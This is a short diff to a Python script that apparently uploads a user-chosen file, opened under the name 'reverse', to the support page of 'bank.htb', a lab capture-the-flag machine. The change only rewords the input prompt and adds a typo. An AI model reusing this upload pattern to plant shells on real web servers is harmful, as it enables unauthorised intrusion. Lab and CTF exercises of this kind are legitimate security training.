@@ -5,7 +5,7 @@
 
 import requests
 
-file_input = input("Please specify the path to the file you'd like to use: ")
+file_input = input("Please specify the path to the file you'd like to uplaod: ")
 reverse = open(file_input,"rb")
 url = "http://bank.htb/support.php"
 data = {"submitadd":"submit"}
